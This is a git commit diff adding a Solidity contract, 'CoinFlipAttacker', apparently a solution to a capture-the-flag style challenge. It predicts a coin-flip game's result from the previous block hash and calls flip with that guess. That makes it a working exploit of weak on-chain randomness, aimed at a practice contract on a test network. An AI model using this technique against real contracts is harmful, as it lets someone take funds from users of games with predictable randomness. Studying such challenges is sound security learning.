ef4b76c40578940549b0ec8a481ef142b29bbb0c
Geoff Donoghue <geoff.donoghue@mail.utoronto.ca>
2022-02-12 09:21:51 -0500

    CoinFlip solution, not deployed to Ropsten yet

--- contracts/CoinFlipAttacker.sol
+++ contracts/CoinFlipAttacker.sol
@@ -5,5 +5,22 @@ import './CoinFlip.sol';
 import '@openzeppelin/contracts/math/SafeMath.sol';
 
 contract CoinFlipAttacker {
+
+    using SafeMath for uint256;
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+    address _attack_address;
+
+    constructor(address _attack_address_in) public {
+        _attack_address = _attack_address_in;
+    }
+
+    function attack() public {
+        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
+        uint256 guess = blockValue.div(FACTOR);
+        bool side = guess == 1 ? true : false;
+
+        CoinFlip(_attack_address).flip(side);
+    }
+
     
 }
